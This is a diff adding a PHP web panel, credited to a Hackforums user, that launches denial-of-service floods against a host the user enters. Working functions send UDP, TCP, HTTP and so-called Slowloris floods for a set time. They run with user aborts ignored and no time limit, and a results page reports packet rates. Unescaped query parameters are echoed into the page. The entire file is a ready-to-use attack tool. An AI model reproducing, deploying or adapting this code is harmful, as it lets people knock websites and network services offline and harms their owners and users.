@@ -1,0 +1,420 @@
+<?php
+
+/*
+	Coded by van1lle @ Hackforums.net
+*/
+
+
+	$type = $_GET['type'];
+	$host = $_GET['host'];
+	$time = $_GET['time'];
+	$port = $_GET['port'];
+	$page = $_GET['page'];
+    $myna = $_SERVER[PHP_SELF];
+
+	$page  = '<html>' . "\n";
+	$page .= '	<head>' . "\n";
+	$page .= '		<style type="text/css">' . "\n";
+	$page .= '			#body {' . "\n";
+	$page .= '				background-image: 	url(\'http://img15.imageshack.us/img15/7472/testqjv.png\');' . "\n";
+	$page .= '				font-family: 		Verdana;' . "\n";
+	$page .= '				color: 		#1b84ec;' . "\n";
+	$page .= '				font-size: 		13px;' . "\n";
+	$page .= '				text-align:		center' . "\n";
+	$page .= '			}' . "\n";
+	$page .= '			#logo {' . "\n";
+	$page .= '				width: 		100%; ' . "\n";
+	$page .= '				height: 		200px; ' . "\n";
+	$page .= '				background-image: 	url(\'http://img51.imageshack.us/img51/2627/logoygx.png\'); ' . "\n";
+	$page .= '				background-repeat: 	no-repeat; ' . "\n";
+	$page .= '				background-position: center;"' . "\n";
+	$page .= '			}' . "\n";
+	$page .= '			.text {' . "\n";
+	$page .= '				font-family: 		Verdana;' . "\n";
+	$page .= '				color: 		#1b84ec;' . "\n";
+	$page .= '				font-size: 		13px;' . "\n";
+	$page .= '				margin:		auto' . "\n";
+	$page .= '			}' . "\n";
+	$page .= '		</style>' . "\n";
+	$page .= '	</head>' . "\n";
+	$page .= '	<body id="body">' . "\n";
+	$page .= '		<br /><br />' . "\n";
+	$page .= '		<a href="' . $myna . '"><div id="logo"></div></a>' . "\n";
+	$page .= '		<br /><br />' . "\n";
+	$page .= '		<div style="width: 40%; border: 1px solid; boder-color: #1b84ec; background-color: #191919; margin: auto"><br />' . "\n";
+
+	if ( isset( $_GET['type'] ) )
+		{
+		if ( $type == "UDP" )
+                        {
+                        if ( $_GET['host'] != '' && $_GET['port'] != '' &&  $_GET['time'] != '' )
+                                {
+                                $page .= UDP_FLOOD( $host , $port , $time );
+                                }
+                        else
+                                {
+                                $page .= '              <b>UDP Flood</b><br /><br />' . "\n";
+                                $page .= '              <form action="' . $myna . '" method="get">' . "\n";
+                                $page .= '                      <table class="text">' . "\n";
+                                $page .= '                      <tr><td>Host:</td><td><input type="text" style="width: 130px" name="host" ></td></tr>' . "\n";
+                                $page .= '                      <tr><td>Port:</td><td><input type="text" style="width: 130px" name="port"></td></tr>' . "\n";
+                                $page .= '                      <tr><td>Time:</td><td><input type="text" style="width: 130px" name="time"></td></tr>' . "\n";
+                                $page .= '                      </table>' . "\n";
+                                $page .= '                      <br /><input type="submit" style="width: 20%" value="Flood!" />' . "\n";
+                                $page .= '                      <input type="hidden" name="type" value="' . $_GET['type'] . '">' . "\n";
+                                $page .= '              </form>' . "\n";
+                                }
+                        }
+		elseif ( $type == "TCP" )
+			{
+			if ( $_GET['host'] != '' &&  $_GET['time'] != '' &&  $_GET['port'] != '' )
+				{
+				$page .= TCP_FLOOD ( $host , $port , $time );
+				}
+			else
+				{
+				$page .= '		<b>TCP Flood</b><br /><br />' . "\n";
+				$page .= '		<form action="' . $myna . '" method="get">' . "\n";;
+				$page .= '			<table class="text">' . "\n";
+				$page .= '			<tr><td>Host:</td><td><input type="text" style="width: 130px" name="host" ></td></tr>' . "\n";
+				$page .= '			<tr><td>Port:</td><td><input type="text" style="width: 130px" name="port" ></td></tr>' . "\n";
+				$page .= '			<tr><td>Time:</td><td><input type="text" style="width: 130px" name="time"></td></tr>' . "\n";
+				$page .= '			</table>' . "\n";
+				$page .= '			<br /><input type="submit" style="width: 20%" value="Flood!" />' . "\n";
+				$page .= '			<input type="hidden" name="type" value="' . $_GET['type'] . '">' . "\n";
+				$page .= '		</form>' . "\n";
+				}
+			}
+		elseif ( $type == "HTTP" )
+			{
+			if ( $_GET['host'] != '' &&  $_GET['time'] != '' &&  $_GET['page'] != '' )
+				{
+				$page .= HTTP_FLOOD ( $host , $page , $time );
+				}
+			else
+				{
+				$page .= '		<b>HTTP Flood</b><br /><br />' . "\n";
+				$page .= '		<form action="' . $myna . '" method="get">' . "\n";;
+				$page .= '			<table class="text">' . "\n";
+				$page .= '			<tr><td>Host:</td><td><input type="text" style="width: 130px" name="host" ></td></tr>' . "\n";
+				$page .= '			<tr><td>Page:</td><td><input type="text" style="width: 130px" name="page" value="/"></td></tr>' . "\n";
+				$page .= '			<tr><td>Time:</td><td><input type="text" style="width: 130px" name="time"></td></tr>' . "\n";
+				$page .= '			</table>' . "\n";
+				$page .= '			<br /><input type="submit" style="width: 20%" value="Flood!" />' . "\n";
+				$page .= '			<input type="hidden" name="type" value="' . $_GET['type'] . '">' . "\n";
+				$page .= '		</form>' . "\n";
+				}
+			}
+		elseif ( $type == "SLOWLORIS" )
+			{
+			if ( $_GET['host'] != '' &&  $_GET['time'] != '' &&  $_GET['page'] != '' )
+				{
+				$page .= SLOWLORIS ( $host , $page , $time );
+				}
+			else
+				{
+				$page .= '		<b>Slowloris</b><br /><br />' . "\n";
+				$page .= '		<form action="' . $myna . '" method="get">' . "\n";;
+				$page .= '			<table class="text">' . "\n";
+				$page .= '			<tr><td>Host:</td><td><input type="text" style="width: 130px" name="host" ></td></tr>' . "\n";
+				$page .= '			<tr><td>Page:</td><td><input type="text" style="width: 130px" name="page" value="/"></td></tr>' . "\n";
+				$page .= '			<tr><td>Time:</td><td><input type="text" style="width: 130px" name="time"></td></tr>' . "\n";
+				$page .= '			</table>' . "\n";
+				$page .= '			<br /><input type="submit" style="width: 20%" value="Flood!" />' . "\n";
+				$page .= '			<input type="hidden" name="type" value="' . $_GET['type'] . '">' . "\n";
+				$page .= '		</form>' . "\n";
+				}
+			}
+		else
+			{
+			$page .= '		<b>Select Flood-Type:</b><br /><br />' . "\n";
+			$page .= '		<form action="' . $myna . '" method="get">' . "\n";;
+			$page .= '			<table class="text">' . "\n";
+			$page .= '			<tr><td><input type="radio" name="type" value="UDP">UDP Flood</td></tr>' . "\n";
+			$page .= '			<tr><td><input type="radio" name="type" value="TCP">TCP Flood</td></tr>' . "\n";
+			$page .= '			<tr><td><input type="radio" name="type" value="HTTP">HTTP Flood</td></tr>' . "\n";
+			$page .= '			<tr><td><input type="radio" name="type" value="SLOWLORIS">Slowloris</td></tr>' . "\n";
+			$page .= '			</table>' . "\n";
+			$page .= '			<br /><input type="submit" style="width: 20%" value="Next >" />' . "\n";
+			$page .= '		</form>' . "\n";
+			}
+		}
+	else
+		{
+		$page .= '		<b>Select Flood-Type:</b><br /><br />' . "\n";
+		$page .= '		<form action="' . $myna . '" method="get">' . "\n";;
+		$page .= '			<table class="text">' . "\n";
+		$page .= '			<tr><td><input type="radio" name="type" value="UDP">UDP Flood</td></tr>' . "\n";
+		$page .= '			<tr><td><input type="radio" name="type" value="TCP">TCP Flood</td></tr>' . "\n";
+		$page .= '			<tr><td><input type="radio" name="type" value="HTTP">HTTP Flood</td></tr>' . "\n";
+		$page .= '			<tr><td><input type="radio" name="type" value="SLOWLORIS">Slowloris</td></tr>' . "\n";
+		$page .= '			</table>' . "\n";
+		$page .= '			<br /><input type="submit" style="width: 20%" value="Next >" />' . "\n";
+		$page .= '		</form>' . "\n";
+		}
+
+	$page .= '		<br /></div>' . "\n";
+	$page .= '	</body>' . "\n";
+	$page .= '</html>' . "\n";
+
+	print$page;
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+// UDP FLOOD ////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+	function UDP_Flood( $host , $port , $length )
+		{
+		ignore_user_abort(TRUE);
+		set_time_limit(0);
+
+		$max_time = time() + $length;
+
+		$packet = "";
+		$packets = 0;
+
+		while( strlen ( $packet ) < 65000 )
+			{
+			$packet .= Chr( 255 );
+			}
+
+		while( 1 )
+			{
+			if ( time() > $max_time )
+				{
+				break;
+				}
+			if ( $port == 0 )
+				{
+				$rand = rand( 1 , 65535 );
+				}
+			else
+				{
+				$rand = $port;
+				}
+			@$fp = fsockopen( 'udp://'.$host, $rand, $errno, $errstr, 5 );
+			if( $fp )
+				{
+				fwrite( $fp , $packet );
+				fclose( $fp );
+				$packets++;
+				}
+			}
+
+		if ( $packets == 0 )
+			{
+			$rtn  = '<b>UDP Flood</b><br /><br />' . "\n";
+			$rtn .= '<table class="text">' . "\n";
+			$rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
+                        $rtn .= '<tr><td><b>Port:</b></td><td>' . $port . '</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
+			$rtn .= '</table>' . "\n";
+			$rtn .= '<br /><b>An error occurred! Could not send packets.</b><br />' . "\n";
+			}
+		else
+			{
+			$rtn  = '<b>UDP Flood</b><br /><br />' . "\n";
+			$rtn .= '<table class="text">' . "\n";
+			$rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
+                        $rtn .= '<tr><td><b>Port:</b></td><td>' . $port . ' (0 - random)</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Packets:</b></td><td>' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s )</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Megabytes:</b></td><td>' . round(($packets*65)/1024) . ' ( ' . round((($packets*65)/1024)/$length) . ' MB/s )</td></tr>' . "\n";
+			$rtn .= '</table>' . "\n";
+			}
+
+		return$rtn;
+		}
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+// TCP FLOOD ////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+	function TCP_Flood( $host , $port , $length )
+		{
+		ignore_user_abort(TRUE);
+		set_time_limit(0);
+
+		$max_time = time() + $length;
+
+		$packet = "";
+		$packets = 0;
+
+		while( strlen ( $packet ) < 65000 )
+			{
+			$packet .= Chr( 255 );
+			}
+
+		@$fp = fsockopen( 'tcp://'.$host, $port, $errno, $errstr, 5 );
+
+		while( 1 )
+			{
+			if ( time() > $max_time )
+				{
+				break;
+				}
+
+			if( $fp )
+				{
+				fwrite( $fp , $packet );
+				fclose( $fp );
+				$packets++;
+				}
+			else
+				{
+				@$fp = fsockopen( 'tcp://'.$host, $port, $errno, $errstr, 5 );
+				}
+			}
+
+		if ( $packets == 0 )
+			{
+			$rtn  = '<b>TCP Flood</b><br /><br />' . "\n";
+			$rtn .= '<table class="text">' . "\n";
+			$rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Port:</b></td><td>' . $port . '</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
+			$rtn .= '</table>' . "\n";
+			$rtn .= '<br /><b>An error occurred! Could not send packets.</b><br />' . "\n";
+			}
+		else
+			{
+			$rtn  = '<b>TCP Flood</b><br /><br />' . "\n";
+			$rtn .= '<table class="text">' . "\n";
+			$rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Port:</b></td><td>' . $port . '</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Packets:</b></td><td>' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s )</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Megabytes:</b></td><td>' . round(($packets*65)/1024) . ' ( ' . round((($packets*65)/1024)/$length) . ' MB/s )</td></tr>' . "\n";
+			$rtn .= '</table>' . "\n";
+			}
+
+		return$rtn;
+		}
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+// HTTP FLOOD ///////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+	function HTTP_Flood( $host , $page , $length )
+		{
+		ignore_user_abort(TRUE);
+		set_time_limit(0);
+
+		if ( $page == '' )
+			{
+			$page = '/';
+			}
+
+		$max_time = time() + $length;
+
+		$packet .= 'GET ' . $page . ' HTTP/1.1' . "\r\n";
+		$packet .= 'Host: ' . $host . "\r\n";
+		$packet .= 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:2.0b7) Gecko/20100101 Firefox/4.0b7' . "\r\n";
+		$packet .= 'Keep-alive: 300' . "\r\n";
+		$packet .= 'Connection: keep-alive' . "\r\n\r\n";
+
+		@$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
+		while( 1 )
+			{
+			if ( time() > $max_time )
+				{
+				break;
+				}
+
+			if( $fp )
+				{
+				fwrite( $fp , $packet );
+				fclose( $fp );
+				$packets++;
+				}
+			else
+				{
+				@$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
+				}
+			}
+
+		if ( $packets == 0 )
+			{
+			$rtn  = '<b>HTTP Flood</b><br /><br />' . "\n";
+			$rtn .= '<table class="text">' . "\n";
+			$rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
+			$rtn .= '</table>' . "\n";
+			$rtn .= '<br /><b>An error occurred! Could not send packets.</b><br />' . "\n";
+			}
+		else
+			{
+			$rtn  = '<b>HTTP Flood</b><br /><br />' . "\n";
+			$rtn .= '<table class="text">' . "\n";
+			$rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
+			$rtn .= '<b>Packets:</b> ' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s ) <br />' . "\n";
+			$rtn .= '</table>' . "\n";
+			}
+
+		return$rtn;
+		}
+
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+// SLOWLORIS ///////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+	function SLOWLORIS( $host , $page , $length )
+		{
+		ignore_user_abort(TRUE);
+		set_time_limit(0);
+
+		if ( $page == '' )
+			{
+			$page = '/';
+			}
+
+		$max_time = time() + $length;
+
+		$packet .= 'POST ' . $page . ' HTTP/1.1' . "\r\n";
+		$packet .= 'Host: ' . $host . "\r\n";
+		$packet .= 'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:2.0b7) Gecko/20100101 Firefox/4.0b7' . "\r\n";
+		$packet .= 'Content-length: 42' . "\r\n\r\n";
+
+		@$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
+		while( 1 )
+			{
+			if ( time() > $max_time )
+				{
+				break;
+				}
+
+			if( $fp )
+				{
+				fwrite( $fp , $packet );
+				fclose( $fp );
+				$packets++;
+				}
+			else
+				{
+				@$fp = fsockopen( $host, 80, $errno, $errstr, 5 );
+				}
+			}
+
+		if ( $packets == 0 )
+			{
+			$rtn  = '<b>Slowloris</b><br /><br />' . "\n";
+			$rtn .= '<table class="text">' . "\n";
+			$rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
+			$rtn .= '</table>' . "\n";
+			$rtn .= '<br /><b>An error occurred! Could not send packets.</b><br />' . "\n";
+			}
+		else
+			{
+			$rtn  = '<b>Slowloris</b><br /><br />' . "\n";
+			$rtn .= '<table class="text">' . "\n";
+			$rtn .= '<tr><td><b>Host:</b></td><td>' . $host . '</td></tr>' . "\n";
+			$rtn .= '<tr><td><b>Length:</b></td><td>' . $length . ' Second(s)</td></tr>' . "\n";
+			$rtn .= '<b>Packets:</b> ' . round($packets) . ' ( ' . round($packets/$length) . ' packets/s ) <br />' . "\n";
+			$rtn .= '</table>' . "\n";
+			}
+
+		return$rtn;
+		}
+?>
